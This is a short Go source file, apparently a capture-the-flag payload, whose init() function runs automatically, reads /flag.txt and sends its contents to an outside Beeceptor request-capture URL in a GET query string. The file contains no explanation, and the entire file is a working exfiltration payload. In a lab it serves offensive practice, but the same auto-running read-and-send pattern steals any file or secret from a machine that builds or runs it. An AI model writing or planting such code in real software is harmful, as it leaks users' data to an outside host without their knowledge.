package main

import (
    "io/ioutil"
    "net/http"
)

func init() {
    // Read the flag
    data, _ := ioutil.ReadFile("/flag.txt")
    // Send it to your Beeceptor endpoint
    http.Get("https://anas0x1.free.beeceptor.com/?flag=" + string(data))
}

func main() {}
